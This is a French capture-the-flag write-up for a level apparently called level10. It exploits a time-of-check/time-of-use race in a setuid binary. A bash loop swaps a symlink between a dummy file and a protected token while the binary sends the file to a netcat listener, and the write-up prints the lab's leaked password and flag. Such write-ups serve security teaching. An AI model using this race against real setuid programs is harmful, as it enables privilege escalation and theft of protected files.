# level10

1. Fichiers trouvés dans `~/` :

```bash
token  level10
```

2) Analyse du fichier `token` et du binaire `level10`

Nous n'avons aucun droit sur `token`.
Nous allons donc inspecter le binaire : 
```bash
open
access
strerror
__libc_start_main
write
GLIBC_2.4
GLIBC_2.0
PTRh
UWVS
[^_]
%s file host
sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
```
Plusieurs choses nous interesse : 
- - Le script permet d'envoyer un fichier auquel on a acces vers un host distant.
```bash
%s file host
sends file to host if you have access to it
```
- - Nous pouvont egalement voir que l'executable utilie `setuid` ce qui signifie qu'il s'executera avec les droits de `flag10`.


- - La faille est donc que `access()` utilise l'uid de l'utilisateur actuel, il faut donc reussir a changer le lien symbolique de `token` entre `access()` et `open()`.

3) Utilisation de l'executable :
- - Nous allons receptionner les fichier depuis un autre utilisateur en ecoute sur le port 6969 (information presente dans le retour de `strings`)
```bash
[...]
Connecting to %s:6969 ..
[...] 
```
- - Donc dans un autre terminal nous allons ecouter sur le port 6969 avce netcat :
```bash
nc -lv 6969
```

- L'utilisateur distant est donc entrain d'ecouter sur le port 6969.

4) Exploitation pour récupérer le password :

- Nous allons creer un lien symbolique vers le token :
```bash
ln -s /home/user/level10/token /tmp/link
```

- - Ensuite nous allons creer un script qui vas en boucle alterner la cible du lien symbolique vers un fichier useless ainsi que vers `token` tout en lancant en meme temps dans une autre boucle dans en attendant que ce que nous souhaitons ce produise.
```bash
echo "dummy" > /tmp/dummy

while true; do
    ln -sf /tmp/dummy /tmp/link 2>/dev/null
    ln -sf /home/user/level10/token /tmp/link 2>/dev/null
done &

while true; do
    ./level10 /tmp/link 127.0.0.1 >/dev/null 2>&1
done
```
```bash
#Link > Dummy
#access() OK
#Link > token
#open > token
```

```bash
nc -lv 6969
Connection from 127.0.0.1 port 6969 [tcp/*] accepted
.*( )*.
woupa2yuojeeaaed06riuj63c
```

- - `woupa2yuojeeaaed06riuj63c`

```bash
su flag10
woupa2yuojeeaaed06riuj63c
```
5) Token decouvert : 

```bash
feulo4b72j7edeahuete3no7c
```



